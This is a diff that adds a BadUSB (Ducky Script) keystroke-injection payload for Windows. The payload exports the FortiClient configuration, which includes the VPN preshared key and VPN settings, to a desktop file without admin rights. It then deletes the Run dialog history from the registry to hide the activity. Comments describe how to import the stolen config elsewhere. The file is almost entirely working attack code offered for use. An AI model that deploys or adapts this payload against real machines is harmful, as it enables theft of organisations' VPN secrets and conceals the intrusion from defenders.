@@ -1,0 +1,31 @@
+REM Forticlient config export using BadUSB
+REM Author: emptythevoid
+REM 8/23/24
+
+
+REM Forticlient file is exported with password. Export does NOT require admin
+REM This export doesn't include VPN login information, but it does include the preshared key and VPN configuration.
+REM "C:\Program Files\Fortinet\FortiClient\FCConfig" -m vpn -f C:\users\user\Desktop\forticonfig.conf -o export -i 1 -p password
+REM restore the config to Forticlient using
+REM Requires Admin Rights
+REM "C:\Program Files\Fortinet\FortiClient\FCConfig" -m vpn -f C:\users\user\Desktop\forticonfig.conf -o import -i 1 -p password
+
+REM USAGE: Set -p password to your secret password - it can be anything. It's just something Forticlient requires
+REM Set the output path to wherever you want it to go.
+
+REM export the forticlient configuration to file
+GUI r
+DELAY 500
+STRING "C:\Program Files\Fortinet\FortiClient\FCConfig" -m all -f C:\users\user\Desktop\forticonfig.conf -o export -i 1 -p password
+DELAY 500
+ENTER
+
+DELAY 2000
+
+REM Clear the Run history and exit
+GUI r 
+DELAY 500
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+STRING exit
+ENTER
